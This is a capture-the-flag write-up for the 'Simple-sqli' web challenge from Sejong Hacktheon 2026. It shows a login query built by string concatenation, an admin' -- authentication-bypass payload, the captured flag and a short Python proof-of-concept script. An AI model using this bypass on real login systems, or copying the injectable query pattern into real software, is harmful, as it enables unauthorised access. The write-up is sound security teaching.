---
title: "Simple-sqli"
date: 2026-05-13
platform: "Sejong Hacktheon 2026"
category: "Web"
difficulty: "Hidden"
tags: ["web", "sejong-hacktheon-2026"]
series: "Sejong Hacktheon 2026"
draft: false
---

## Challenge Information
- **Category**: Web Exploitation
- **Event**: Sejong Hacktheon 2026
- **Author**: Hidden
- **Difficulty**: Hidden
### 1. Initial Analysis
This is a Web challenge featuring a standard login form interface:

![](./images/Pasted%20image%2020260425082354.png)

Since it is a whitebox challenge, I analyzed the source code directly. The challenge name "Simple-sqli" strongly suggests a SQL Injection vulnerability, so I focused my investigation on the database query logic.

The objective is to retrieve the **FLAG** located in the `secret` column of the `admin` user within the `users` table.

![](./images/Pasted%20image%2020260425084127.png)

Check the `app.py` file, a critical vulnerability was identified in lines 44-47:

```python
        query = (
            "SELECT username, role, secret FROM users "
            f"WHERE username = '{username}' AND password = '{password}'"
        )
```

The `username` and `password` inputs are directly concatenated into the SQL query string using strings without any sanitization or filtering. This leads to 99% **SQL Injection**.
### 2. Exploitation
The simple exploitation method is an Authentication Bypass by commenting out the password verification clause:

```
username = admin' --
password = <ANYTHING_STRING>
```

When the payload is injected, the final SQL query executed by the database becomes:

```sql
SELECT username, role, secret FROM users WHERE username = 'admin' --' AND password = '<ANYTHING_STRING>'
```

- The single quote (`'`) after `admin` closes the username string literal.
- The double dash (`--`) acts as a comment indicator in SQL, causing the database to ignore the rest of the query (bypass password check).
### 3. Result
* **Payload used**
```
	username = admin' --
	password = BKSEC
```

![](./images/Pasted%20image%2020260425084734.png)

* **Flag:** `hacktheon2026{d0nt_f0rget_the_s1ng1e_qu0te}`
* PoC:
```python
import requests  
  
# Configuration  
TARGET_URL = "URL"  
  
  
def get_flag():  
    session = requests.Session()  
  
    # SQL Injection payload to bypass authentication  
    payload = {  
        "username": "admin'--",  
        "password": "BKSEC"  
    }  
  
    # Send the malicious login request  
    response = session.post(f"{TARGET_URL}/", data=payload)  
  
    # Check if we were redirected to the flag page  
    if "/flag" in response.url or "admin" in response.text:  
        print("[+] Login successful as admin!")  
        # Access the flag page specifically if needed  
        flag_page = session.get(f"{TARGET_URL}/flag")  
        print("[+] Flag:")  
        print(flag_page.text)  
    else:  
        print("[-] Exploit failed.")  
  
  
if __name__ == "__main__":  
    get_flag()
```